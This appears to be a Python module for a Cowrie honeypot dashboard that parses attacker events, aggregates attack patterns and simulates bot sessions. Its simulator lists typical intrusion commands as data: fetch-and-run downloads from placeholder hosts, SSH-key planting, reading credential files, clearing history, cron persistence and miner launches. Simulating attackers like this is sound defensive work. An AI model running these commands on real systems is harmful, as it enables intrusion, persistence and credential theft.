"""
Honeypot screen: events from a Cowrie SSH/Telnet honeypot, aggregated for the dashboard.

Cowrie writes one JSON object per line (cowrie.json). parse_cowrie() turns one such line
into a small, validated event; HoneypotStore keeps the last WINDOW of them and builds the
view the page reads from GET /api/honeypot.

Until the real honeypot is running, Simulator produces Cowrie-format JSON lines (same
event ids and fields) and feeds them through the SAME parser, so the page, the parser and
the aggregation are exercised exactly as they will be with real data. Simulated sources use
documentation IP ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and example.net URLs.

Everything here is attacker-controlled input: every string is length-limited and stripped of
control characters, unknown event ids are ignored, and the page escapes everything it shows.
"""

import json
import random
import re
import sqlite3
import threading
import time
from collections import Counter, OrderedDict, deque
from datetime import datetime, timezone

import honeypot_rules as rules

WINDOW = 24 * 3600          # what the Honeypot screen covers
RETENTION = 30 * 86400      # what's kept on disk, and what the Attack patterns screen covers
BUCKET = 900                # timeline resolution (15 min)
MAX_EVENTS = 200_000        # hard cap regardless of window
MAX_SESSIONS = 50_000
LIMITS = {"ip": 45, "username": 64, "password": 64, "input": 300, "url": 300, "version": 100, "session": 32}
_CTRL = re.compile(r"[\x00-\x1f\x7f]")

KINDS = {
    "cowrie.session.connect": "connect",
    "cowrie.client.version": "client",
    "cowrie.login.failed": "login_failed",
    "cowrie.login.success": "login_success",
    "cowrie.command.input": "command",
    "cowrie.command.failed": "command",
    "cowrie.session.file_download": "download",
    "cowrie.session.file_download.failed": "download",
    "cowrie.session.closed": "closed",
}


def _clean(value, field):
    if value is None:
        return None
    s = _CTRL.sub(" ", str(value))
    return s[:LIMITS[field]]


def _epoch(ts):
    """Cowrie timestamps: '2026-11-18T17:03:51.123456Z'."""
    try:
        return datetime.strptime(str(ts)[:26].rstrip("Z"), "%Y-%m-%dT%H:%M:%S.%f").replace(tzinfo=timezone.utc).timestamp()
    except ValueError:
        try:
            return datetime.strptime(str(ts)[:19], "%Y-%m-%dT%H:%M:%S").replace(tzinfo=timezone.utc).timestamp()
        except ValueError:
            return None


def parse_cowrie(line):
    """One cowrie.json line -> normalized event dict, or None if it isn't one we use."""
    if not isinstance(line, (str, bytes)) or len(line) > 16384:
        return None
    try:
        raw = json.loads(line)
    except (ValueError, TypeError):
        return None
    if not isinstance(raw, dict):
        return None
    kind = KINDS.get(raw.get("eventid"))
    t = _epoch(raw.get("timestamp"))
    session = _clean(raw.get("session"), "session")
    if not kind or t is None or not session:
        return None
    ev = {"t": t, "kind": kind, "session": session, "ip": _clean(raw.get("src_ip"), "ip")}
    if kind == "connect":
        ev["protocol"] = "telnet" if raw.get("protocol") == "telnet" or raw.get("dst_port") in (23, 2323) else "ssh"
    elif kind in ("login_failed", "login_success"):
        ev["username"] = _clean(raw.get("username"), "username") or ""
        ev["password"] = _clean(raw.get("password"), "password") or ""
    elif kind == "command":
        ev["input"] = _clean(raw.get("input"), "input") or ""
    elif kind == "download":
        ev["url"] = _clean(raw.get("url"), "url") or ""
    elif kind == "client":
        ev["version"] = _clean(raw.get("version"), "version") or ""
    elif kind == "closed":
        try:
            ev["duration"] = max(0.0, min(float(raw.get("duration") or 0), 86400.0))
        except (TypeError, ValueError):
            ev["duration"] = 0.0
    return ev


class HoneypotDB:
    """30 days of honeypot history in SQLite: every event (raw, for re-analysis later) and one row
    per finished session. Fingerprints, tags and summaries are NOT stored: they're computed from the
    stored commands when read, so improving the rules re-labels the whole history.
    path=":memory:" keeps it in RAM (simulated data must never mix with the real history on disk)."""

    def __init__(self, path=":memory:", retention=RETENTION):
        self.retention = retention
        self.db = sqlite3.connect(path, check_same_thread=False)
        self.lock = threading.Lock()
        self.batch = False
        self._cache = {}          # commands json -> analysis (no username/password)
        self._patterns = (0, None, None)
        with self.lock:
            self.db.executescript("""
                PRAGMA journal_mode=WAL;
                CREATE TABLE IF NOT EXISTS events (t REAL, session TEXT, kind TEXT, data TEXT);
                CREATE INDEX IF NOT EXISTS events_t ON events (t);
                CREATE TABLE IF NOT EXISTS sessions (
                    id TEXT PRIMARY KEY, start REAL, end REAL, ip TEXT, cc TEXT, country TEXT, city TEXT,
                    protocol TEXT, client TEXT, logins INTEGER, shell INTEGER, username TEXT, password TEXT,
                    commands TEXT, downloads TEXT);
                CREATE INDEX IF NOT EXISTS sessions_start ON sessions (start);
            """)

    def _commit(self):
        if not self.batch:
            self.db.commit()

    def bulk(self, on):
        """Batch writes (backfill): no commit per row until switched off."""
        with self.lock:
            self.batch = on
            if not on:
                self.db.commit()

    def add_event(self, ev):
        data = {k: v for k, v in ev.items() if k not in ("t", "session", "kind")}
        with self.lock:
            self.db.execute("INSERT INTO events VALUES (?,?,?,?)", (ev["t"], ev["session"], ev["kind"], json.dumps(data)))
            self._commit()

    def add_session(self, s):
        g = s.get("geo") or {}
        with self.lock:
            self.db.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", (
                s["id"], s["start"], s["end"], s["ip"], g.get("cc"), g.get("country"), g.get("city"), s["protocol"],
                s["client"], s["logins"], int(s["shell"]), s["user"], s["password"],
                json.dumps(s["commands"]), json.dumps(s["downloads"])))
            self._commit()

    def purge(self, now=None):
        cutoff = (now or time.time()) - self.retention
        with self.lock:
            self.db.execute("DELETE FROM events WHERE t < ?", (cutoff,))
            self.db.execute("DELETE FROM sessions WHERE start < ?", (cutoff,))
            self.db.commit()

    def analysis(self, commands_json, downloads_json="[]"):
        key = commands_json + "\0" + downloads_json
        a = self._cache.get(key)
        if a is None:
            a = rules.analyze(json.loads(commands_json), json.loads(downloads_json))
            if len(self._cache) > 20000:
                self._cache.clear()
            self._cache[key] = a
        return a

    def patterns(self, now=None, max_age=30):
        """Attack patterns over the retention window (cached for max_age seconds)."""
        now = now or time.time()
        at, view, index = self._patterns
        if view is not None and now - at < max_age:
            return view, index
        with self.lock:
            rows = self.db.execute(
                "SELECT start, ip, cc, country, username, password, commands, downloads FROM sessions "
                "WHERE shell = 1 AND commands != '[]' AND start >= ? ORDER BY start", (now - self.retention,)).fetchall()
        day0 = now - 14 * 86400
        groups, unrec = {}, Counter()
        for start, ip, cc, country, user, pw, cmds, dls in rows:
            a = self.analysis(cmds, dls)
            fp = a["fingerprint"]
            g = groups.get(fp)
            if g is None:
                g = groups[fp] = {"fp": fp, "a": a, "cmds": cmds, "n30": 0, "n24": 0, "ips": set(), "cc": Counter(),
                                  "names": {}, "first": start, "last": start, "daily": [0] * 14, "creds": Counter(),
                                  "hosts": Counter()}
            g["n30"] += 1
            g["n24"] += start >= now - 86400
            g["ips"].add(ip)
            if cc:
                g["cc"][cc] += 1
                g["names"][cc] = country or cc
            g["last"], g["cmds"] = start, cmds
            if start >= day0:
                g["daily"][min(13, int((start - day0) // 86400))] += 1
            g["creds"][f"{user} / {pw}"] += 1
            for h in a["hosts"]:
                g["hosts"][h] += 1
            for u in a["unrecognized"]:
                unrec[u] += 1

        def spread(g):
            ips, ccs = len(g["ips"]), len(g["cc"])
            return "botnet" if ips >= 10 and ccs >= 4 else "single source" if ips == 1 else "small group"

        out = []
        for g in groups.values():
            a = g["a"]
            out.append({
                "fp": g["fp"], "label": a["label"], "tags": a["tags"], "summary": a["summary"],
                "script": rules.normalize_all(json.loads(g["cmds"]))[:14],
                "n_24h": g["n24"], "n_30d": g["n30"], "ips": len(g["ips"]), "countries": len(g["cc"]),
                "first_age_s": round(now - g["first"]), "last_age_s": round(now - g["last"]),
                "daily": g["daily"], "spread": spread(g),
                "creds": [[k, v] for k, v in g["creds"].most_common(3)],
                "top_countries": [[c, g["names"][c], n] for c, n in g["cc"].most_common(3)],
                "hosts": [[k, v] for k, v in g["hosts"].most_common(4)],
            })
        out.sort(key=lambda p: (-p["n_24h"], -p["n_30d"]))
        new = sorted([p for p in out if p["first_age_s"] < 86400], key=lambda p: p["first_age_s"])
        view = {
            "window_days": round(self.retention / 86400),
            "shell_sessions": len(rows), "pattern_count": len(out), "new_24h": len(new),
            "patterns": out[:25], "new": new[:8],
            "unrecognized": [[k, v] for k, v in unrec.most_common(12)],
        }
        index = {p["fp"]: {"n_30d": p["n_30d"], "ips": p["ips"], "first_age_s": p["first_age_s"], "label": p["label"]}
                 for p in out}
        self._patterns = (now, view, index)
        return view, index


class HoneypotStore:
    """The last WINDOW seconds of honeypot events, plus per-session state."""

    def __init__(self, source="cowrie", geo=None, window=WINDOW, db=None):
        self.source, self.geo, self.window = source, geo, window
        self.db = db
        self.events = deque()
        self.sessions = OrderedDict()
        self.lock = threading.Lock()
        self.last_event_at = None

    def add_line(self, line):
        ev = parse_cowrie(line)
        if ev:
            self.add(ev)
        return ev is not None

    def add(self, ev, where=None):
        """ev from parse_cowrie(); where = geo dict (lat, lon, city, cc, country) if already known."""
        with self.lock:
            s = self.sessions.get(ev["session"])
            if s is None:
                if where is None and self.geo and ev.get("ip"):
                    where = self.geo.lookup(ev["ip"]) or {}
                s = {"id": ev["session"], "ip": ev.get("ip"), "start": ev["t"], "end": None, "protocol": "ssh",
                     "geo": where or {}, "client": None, "logins": 0, "user": None, "password": None,
                     "shell": False, "commands": [], "downloads": [], "duration": None}
                self.sessions[ev["session"]] = s
                if len(self.sessions) > MAX_SESSIONS:
                    self.sessions.popitem(last=False)
            k = ev["kind"]
            if k == "connect":
                s["protocol"] = ev["protocol"]
            elif k == "client":
                s["client"] = ev["version"]
            elif k in ("login_failed", "login_success"):
                s["logins"] += 1
                if k == "login_success":
                    s["shell"], s["user"], s["password"] = True, ev["username"], ev["password"]
            elif k == "command" and len(s["commands"]) < 50:
                s["commands"].append(ev["input"])
            elif k == "download" and len(s["downloads"]) < 20:
                s["downloads"].append(ev["url"])
            elif k == "closed":
                s["end"], s["duration"] = ev["t"], ev["duration"]
            self.events.append(ev)
            if self.db:
                self.db.add_event(ev)
                if k == "closed":
                    self.db.add_session(s)
            self.last_event_at = max(self.last_event_at or 0, ev["t"])
            self._trim(ev["t"])

    def _trim(self, now):
        cutoff = now - self.window
        while self.events and (self.events[0]["t"] < cutoff or len(self.events) > MAX_EVENTS):
            self.events.popleft()
        while self.sessions:
            first = next(iter(self.sessions.values()))
            if first["start"] >= cutoff:
                break
            self.sessions.popitem(last=False)

    def view(self, now=None):
        now = now or time.time()
        pindex = self.db.patterns(now)[1] if self.db else {}
        cutoff = now - self.window
        nb = self.window // BUCKET
        start = int((now - self.window) // BUCKET * BUCKET) + BUCKET
        tl = {"sessions": [0] * nb, "logins": [0] * nb, "shells": [0] * nb}
        users, pwds, pairs, cmds, urls, clients = Counter(), Counter(), Counter(), Counter(), Counter(), Counter()
        countries, points = {}, {}
        n_logins = n_success = n_cmds = n_dl = 0
        recent_sessions = 0
        with self.lock:
            events = [e for e in self.events if e["t"] >= cutoff]
            sessions = [s for s in self.sessions.values() if s["start"] >= cutoff]
            feed_src = events[-60:]
            shells = [dict(s, commands=list(s["commands"]), downloads=list(s["downloads"]))
                      for s in sessions if s["shell"] and s["commands"]][-6:]
            ses_by_id = {s["id"]: s for s in sessions}
        for e in events:
            b = int((e["t"] - start) // BUCKET)
            k = e["kind"]
            if k in ("login_failed", "login_success"):
                n_logins += 1
                users[e["username"]] += 1
                pwds[e["password"]] += 1
                pairs[f'{e["username"]} / {e["password"]}'] += 1
                if 0 <= b < nb:
                    tl["logins"][b] += 1
                if k == "login_success":
                    n_success += 1
                    if 0 <= b < nb:
                        tl["shells"][b] += 1
            elif k == "command":
                n_cmds += 1
                cmds[e["input"][:80]] += 1
            elif k == "download":
                n_dl += 1
                urls[e["url"][:120]] += 1
        for s in sessions:
            b = int((s["start"] - start) // BUCKET)
            if 0 <= b < nb:
                tl["sessions"][b] += 1
            if s["start"] >= now - 600:
                recent_sessions += 1
            if s["client"]:
                clients[s["client"]] += 1
            g = s["geo"]
            if g.get("cc"):
                c = countries.setdefault(g["cc"], {"cc": g["cc"], "name": g.get("country") or g["cc"], "n": 0})
                c["n"] += 1
            if g.get("lat") is not None and g.get("lon") is not None:
                key = (round(g["lat"], 1), round(g["lon"], 1))
                p = points.setdefault(key, {"lat": key[0], "lon": key[1], "city": g.get("city"), "cc": g.get("cc"), "n": 0, "last": 0})
                p["n"] += 1
                p["last"] = max(p["last"], s["start"])

        def top(counter, n=8):
            return [[k, v] for k, v in counter.most_common(n)]

        def where(s):
            g = s["geo"] if s else {}
            return {"cc": g.get("cc"), "city": g.get("city"), "country": g.get("country")}

        feed = []
        for e in reversed(feed_src):
            k = e["kind"]
            if k == "login_failed":
                text = f'{e["username"]} / {e["password"]}'
            elif k == "login_success":
                text = f'{e["username"]} / {e["password"]}'
            elif k == "command":
                text = e["input"]
            elif k == "download":
                text = e["url"]
            elif k == "connect":
                text = e.get("protocol", "")
            elif k == "client":
                text = e["version"]
            else:
                text = f'{round(e.get("duration") or 0)} s'
            s = ses_by_id.get(e["session"])
            feed.append({"age_s": round(now - e["t"], 1), "kind": k, "ip": e.get("ip"), "text": text[:160],
                         "protocol": s["protocol"] if s else None, **where(s)})
            if len(feed) >= 40:
                break

        return {
            "source": self.source,
            "simulated": self.source == "simulated",
            "window_s": self.window,
            "last_event_age_s": round(now - self.last_event_at, 1) if self.last_event_at else None,
            "summary": {
                "sessions": len(sessions), "unique_ips": len({s["ip"] for s in sessions}), "countries": len(countries),
                "login_attempts": n_logins, "logins_ok": n_success, "commands": n_cmds, "downloads": n_dl,
                "sessions_per_min": round(recent_sessions / 10, 1),
            },
            "timeline": dict(tl, bucket_s=BUCKET, start_age_s=round(now - start)),
            "top": {
                "usernames": top(users), "passwords": top(pwds), "pairs": top(pairs), "commands": top(cmds),
                "urls": top(urls, 6), "clients": top(clients, 6),
                "countries": [[c["cc"], c["name"], c["n"]] for c in sorted(countries.values(), key=lambda c: -c["n"])[:8]],
            },
            "points": [dict(p, last_age_s=round(now - p.pop("last"))) for p in
                       sorted(points.values(), key=lambda p: -p["n"])[:400]],
            "feed": feed,
            "shells": [self._shell(s, now, where(s), pindex) for s in reversed(shells)],
        }

    def _shell(self, s, now, place, pindex):
        a = rules.analyze(s["commands"], s["downloads"], s["user"], s["password"])
        p = pindex.get(a["fingerprint"])
        return {"age_s": round(now - s["start"]), "ip": s["ip"], "protocol": s["protocol"], **place,
                "username": s["user"], "password": s["password"], "commands": s["commands"][:12],
                "more": max(0, len(s["commands"]) - 12), "downloads": s["downloads"][:3],
                "duration_s": round(s["duration"]) if s["duration"] is not None else None,
                "open": s["end"] is None, "label": a["label"], "tags": a["tags"], "summary": a["summary"],
                "fp": a["fingerprint"], "pattern": p}

    def patterns_view(self, now=None):
        if not self.db:
            return {"source": self.source, "simulated": self.source == "simulated", "patterns": [], "new": [],
                    "unrecognized": [], "pattern_count": 0, "new_24h": 0, "shell_sessions": 0, "window_days": 0}
        view, _ = self.db.patterns(now)
        return dict(view, source=self.source, simulated=self.source == "simulated")


# ------------------------------------------------------------------ simulator
# lat, lon, city, cc, country, weight
SOURCES = [
    (39.04, -77.49, "Ashburn", "US", "United States", 10), (37.39, -121.96, "Santa Clara", "US", "United States", 5),
    (32.78, -96.80, "Dallas", "US", "United States", 3), (52.37, 4.90, "Amsterdam", "NL", "Netherlands", 8),
    (50.11, 8.68, "Frankfurt am Main", "DE", "Germany", 6), (51.51, -0.13, "London", "GB", "United Kingdom", 3),
    (55.75, 37.62, "Moscow", "RU", "Russia", 6), (39.90, 116.40, "Beijing", "CN", "China", 9),
    (31.23, 121.47, "Shanghai", "CN", "China", 8), (22.54, 114.06, "Shenzhen", "CN", "China", 5),
    (37.57, 126.98, "Seoul", "KR", "South Korea", 4), (1.35, 103.82, "Singapore", "SG", "Singapore", 5),
    (19.08, 72.88, "Mumbai", "IN", "India", 4), (-23.55, -46.63, "Sao Paulo", "BR", "Brazil", 4),
    (21.03, 105.85, "Hanoi", "VN", "Vietnam", 4), (-6.21, 106.85, "Jakarta", "ID", "Indonesia", 3),
    (41.01, 28.98, "Istanbul", "TR", "Turkiye", 2), (44.43, 26.10, "Bucharest", "RO", "Romania", 2),
    (35.69, 51.39, "Tehran", "IR", "Iran", 2), (6.52, 3.38, "Lagos", "NG", "Nigeria", 1),
    (13.75, 100.50, "Bangkok", "TH", "Thailand", 2), (25.03, 121.57, "Taipei", "TW", "Taiwan", 2),
    (43.65, -79.38, "Toronto", "CA", "Canada", 1), (-34.60, -58.38, "Buenos Aires", "AR", "Argentina", 1),
]
DOC_NETS = ["192.0.2.", "198.51.100.", "203.0.113."]
USERS = [("root", 30), ("admin", 12), ("ubuntu", 5), ("user", 5), ("test", 4), ("oracle", 3), ("postgres", 3),
         ("pi", 3), ("git", 2), ("ftpuser", 2), ("support", 2), ("guest", 2), ("debian", 1), ("hadoop", 1), ("deploy", 1)]
PASSWORDS = [("123456", 18), ("password", 8), ("admin", 7), ("root", 6), ("12345", 5), ("1234", 5), ("qwerty", 4),
             ("123", 4), ("ubuntu", 3), ("raspberry", 3), ("P@ssw0rd", 3), ("toor", 3), ("test", 3), ("111111", 2),
             ("admin123", 2), ("1qaz2wsx", 2), ("changeme", 1), ("default", 1), ("123456789", 2), ("Passw0rd!", 1)]
TELNET_PAIRS = [("root", "vizxv"), ("root", "xc3511"), ("admin", "admin"), ("root", "default"), ("support", "support"),
                ("root", "888888"), ("admin", "1234"), ("user", "user"), ("root", "anko")]
CLIENTS = [("SSH-2.0-Go", 12), ("SSH-2.0-libssh2_1.10.0", 6), ("SSH-2.0-OpenSSH_8.9p1", 4), ("SSH-2.0-paramiko_3.4.0", 3),
           ("SSH-2.0-libssh_0.10.6", 3), ("SSH-2.0-PuTTY_Release_0.76", 1), ("SSH-2.0-AsyncSSH_2.14.2", 1)]
# What bots typically do once "in". {host}, {file}, {key}, {rand} vary from run to run, the way real
# botnets rotate payload servers, file names and keys (normalization makes them one pattern anyway).
SCRIPTS = [
    (["uname -a", "cat /proc/cpuinfo | grep name | wc -l", "free -m | grep Mem", "nproc", "w", "crontab -l"], 8),
    (["cd ~; chattr -ia .ssh; lockr -ia .ssh",
      "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa {key} {rand}\" >> .ssh/authorized_keys && chmod -R go= ~/.ssh",
      "cat /proc/cpuinfo | grep name | head -n 1", "ls -lh $(which ls)", "uname -m"], 6),
    (["cd /tmp || cd /var/run || cd /mnt", "wget http://{host}/bins/{file}; chmod +x {file}; ./{file} ssh",
      "curl -O http://{host}/bins/{file}", "rm -rf {file}"], 4),
    (["enable", "system", "shell", "sh", "cat /bin/echo", "/bin/busybox ECCHI"], 4),
    (["echo -e \"\\x6F\\x6B\"", "uname -s -v -n -r -m", "ps aux | grep -v grep | grep miner", "pkill -9 xmrig",
      "wget -qO- http://payload.example.net/setup.sh | sh"], 3),
    (["cat /etc/passwd", "ls -la /home", "history -c", "export HISTFILE=/dev/null", "last"], 2),
]
# Rarer, assembled per run: makes new patterns appear now and then, including commands no rule
# knows yet (they show up in the patterns screen's "unrecognized" list).
POOL = [
    "uname -a", "nproc", "lscpu | grep Model", "free -g", "df -h", "uptime", "whoami", "id", "hostname",
    "lspci | grep -i vga", "nvidia-smi", "getconf LONG_BIT", "dmidecode -t system", "cat /etc/os-release",
    "cd /dev/shm", "tftp -g -r mips {host}", "wget http://{host}/{file}.sh -O- | sh", "nohup ./{rand} -o pool.example.net:3333 &",
    "perl -MIO -e 'print 1'", "nc -zv {host} 4444", "openssl passwd -1 {rand}", "awk 'BEGIN{{print 1}}'",
    "systemctl enable {rand}", "useradd -m -s /bin/bash sys{rand}", "echo \"* * * * * /tmp/{file}\" | crontab -",
    "cat /root/.ssh/id_rsa", "iptables -F", "ulimit -n 65535", "sysctl -w vm.nr_hugepages=1280",
]
FILES = ["x86_64", "bins.sh", "arm7", "mips", "kworker", "sshd"]
URL_RE = re.compile(r"https?://[^\s;|\"']+")


def _pick(rng, items):
    """items are (value..., weight); returns value (or the tuple of values)."""
    return rng.choices([i[:-1] if len(i) > 2 else i[0] for i in items], weights=[i[-1] for i in items])[0]


def _replay(lines, geo):
    """Session dict from one session's Cowrie lines, without a store (for history backfill)."""
    tmp = HoneypotStore(window=10 ** 9)
    for i, (_, line) in enumerate(lines):
        ev = parse_cowrie(line)
        if ev:
            tmp.add(ev, where=geo if i == 0 else None)
    return next(iter(tmp.sessions.values()), None)


class Simulator:
    """Generates Cowrie-format JSON lines. Default Cowrie userdb: root works with any password
    except 'root' and '123456' (that's what makes bots 'get in'), everyone else is rejected."""

    def __init__(self, store, rate_per_hour=180, seed=None, now=None):
        self.store, self.rate = store, rate_per_hour
        self.rng = random.Random(seed)
        # Rarer scripts that "appear" at some point and then keep recurring, like a new botnet
        # campaign: most started during the 30 days, a few in the last day, a few still to come.
        now = now or time.time()
        births = [now - self.rng.uniform(1, 30) * 86400 for _ in range(12)] + \
                 [now - self.rng.uniform(1, 20) * 3600 for _ in range(3)] + [now + h * 3600 for h in (2, 7, 15, 30)]
        self.rare = [(b, self.rng.sample(POOL, self.rng.randint(3, 6))) for b in births]
        self.attackers = {}   # recurring sources keep their IP + location

    def _ts(self, t):
        return datetime.fromtimestamp(t, timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")

    def _source(self):
        if self.attackers and self.rng.random() < 0.35:
            return self.rng.choice(list(self.attackers.values()))
        loc = _pick(self.rng, SOURCES)
        ip = self.rng.choice(DOC_NETS) + str(self.rng.randint(1, 254))
        src = {"ip": ip, "geo": {"lat": loc[0] + self.rng.uniform(-1.5, 1.5), "lon": loc[1] + self.rng.uniform(-1.5, 1.5),
                                 "city": loc[2], "cc": loc[3], "country": loc[4]}}
        self.attackers[ip] = src
        if len(self.attackers) > 400:
            self.attackers.pop(next(iter(self.attackers)))
        return src

    def _script(self, t):
        live = [sc for b, sc in self.rare if b <= t]
        roll = self.rng.random()
        if roll < 0.005:                                   # a true one-off
            script = self.rng.sample(POOL, self.rng.randint(3, 6))
        elif roll < 0.06 and live:
            script = self.rng.choice(live)
        else:
            script = _pick(self.rng, SCRIPTS)
        b64 = "AAAAB3NzaC1yc2EAAAADAQABAAABAQ" + "".join(self.rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/") for _ in range(40))
        rand = "".join(self.rng.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(6)) + str(self.rng.randint(1000, 9999))
        rand = "".join(self.rng.sample(rand, len(rand)))
        fill = {"host": f"198.51.100.{self.rng.randint(2, 250)}", "file": self.rng.choice(FILES), "key": b64, "rand": rand}
        return [c.format(**fill) for c in script]

    def session_lines(self, t, force_shell=False):
        """[(t, json_line)] for one attacker session starting at t, plus its geo."""
        src = self._source()
        sid = "%012x" % self.rng.getrandbits(48)
        telnet = self.rng.random() < 0.2
        base = {"session": sid, "src_ip": src["ip"], "sensor": "honeypot"}
        out = []

        def emit(dt, eventid, **kw):
            nonlocal t
            t += dt
            out.append((t, json.dumps(dict(base, eventid=eventid, timestamp=self._ts(t), **kw))))

        emit(0, "cowrie.session.connect", src_port=self.rng.randint(1025, 65000), dst_port=23 if telnet else 22,
             protocol="telnet" if telnet else "ssh")
        roll = self.rng.uniform(0.81, 1.0) if force_shell else self.rng.random()
        if not telnet:
            emit(0.3, "cowrie.client.version", version=_pick(self.rng, CLIENTS))
        if roll < 0.25:                                  # scanner: banner grab only
            emit(self.rng.uniform(0.5, 3), "cowrie.session.closed", duration=round(self.rng.uniform(0.5, 4), 2))
            return out, src["geo"]
        got_in = False
        tries = self.rng.randint(1, 3) if roll > 0.8 else self.rng.randint(2, 12)
        for _ in range(tries):
            u, p = self.rng.choice(TELNET_PAIRS) if telnet else (_pick(self.rng, USERS), _pick(self.rng, PASSWORDS))
            ok = u == "root" and p not in ("root", "123456") and (roll > 0.8 or self.rng.random() < 0.08)
            emit(self.rng.uniform(0.3, 2.5), "cowrie.login.success" if ok else "cowrie.login.failed", username=u, password=p)
            if ok:
                got_in = True
                break
        if force_shell and not got_in:                   # history backfill only wants shell sessions
            emit(self.rng.uniform(0.3, 2.5), "cowrie.login.success", username="root", password=_pick(self.rng, PASSWORDS[2:]))
            got_in = True
        if got_in:
            for cmd in self._script(t):
                emit(self.rng.uniform(0.2, 3), "cowrie.command.input", input=cmd)
                for url in URL_RE.findall(cmd):
                    emit(0.4, "cowrie.session.file_download.failed", url=url)   # no egress: downloads always fail
        emit(self.rng.uniform(0.5, 5), "cowrie.session.closed", duration=round(t - out[0][0] + 1, 2))
        return out, src["geo"]

    def _feed(self, lines, geo):
        for i, (_, line) in enumerate(lines):
            ev = parse_cowrie(line)
            if ev:
                self.store.add(ev, where=geo if i == 0 else None)

    def backfill_history(self, now=None, days=RETENTION // 86400):
        """Older history (days 2..N) straight into the database, for the Attack patterns screen.
        Only sessions that got a shell matter there, so only those are generated (about 1 in 5)."""
        db = self.store.db
        if not db:
            return
        now = now or time.time()
        t, stop = now - days * 86400, now - self.store.window
        db.bulk(True)
        try:
            while t < stop:
                t += self.rng.expovariate(self.rate * 0.2 / 3600)
                lines, geo = self.session_lines(t, force_shell=True)
                s = _replay(lines, geo)
                if s:
                    db.add_session(s)
        finally:
            db.bulk(False)

    def backfill(self, now=None):
        """The last WINDOW of history, so the screen isn't empty at start. Busier in bursts."""
        now = now or time.time()
        t = now - self.store.window
        pending = []
        while t < now - 60:
            hour_factor = 0.6 + 0.8 * self.rng.random() if int(t // 3600) % 5 else 2.5   # an occasional busy hour
            t += self.rng.expovariate(self.rate * hour_factor / 3600)
            lines, geo = self.session_lines(t)
            pending.append((lines, geo))
        events = []
        for lines, geo in pending:
            for i, (tt, line) in enumerate(lines):
                if tt < now:
                    events.append((tt, line, geo if i == 0 else None))
        events.sort(key=lambda x: x[0])
        if self.store.db:
            self.store.db.bulk(True)
        try:
            for _, line, geo in events:
                ev = parse_cowrie(line)
                if ev:
                    self.store.add(ev, where=geo)
        finally:
            if self.store.db:
                self.store.db.bulk(False)

    def run_forever(self):
        """Live: start sessions at random intervals; each plays out over its real duration."""
        while True:
            time.sleep(self.rng.expovariate(self.rate / 3600))
            lines, geo = self.session_lines(time.time())
            threading.Thread(target=self._play, args=(lines, geo), daemon=True).start()

    def _play(self, lines, geo):
        for i, (t, line) in enumerate(lines):
            delay = t - time.time()
            if delay > 0:
                time.sleep(delay)
            ev = parse_cowrie(line)
            if ev:
                self.store.add(ev, where=geo if i == 0 else None)
